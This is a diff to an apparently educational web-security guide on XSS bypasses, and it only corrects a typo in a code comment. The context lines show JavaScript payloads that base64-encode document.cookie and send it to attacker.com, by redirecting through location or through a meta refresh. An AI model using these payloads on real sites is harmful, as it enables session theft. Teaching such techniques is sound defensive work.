@@ -635,7 +635,7 @@ A more general bypass for this is to _redirect_ the user fully using JavaScript,
 
 <pre class="language-javascript" data-overflow="wrap"><code class="lang-javascript">// Redirect via document.location:
 <strong>location = `http://attacker.com/leak?${btoa(document.cookie)}`
-</strong>// Redirect via &#x3C;meta> tag (only at start of page loadd):
+</strong>// Redirect via &#x3C;meta> tag (only at start of page load):
 <strong>document.write(`&#x3C;meta http-equiv="refresh" content="0; url=http://attacker.com/leak?${btoa(document.cookie)}">`)
 </strong></code></pre>
 
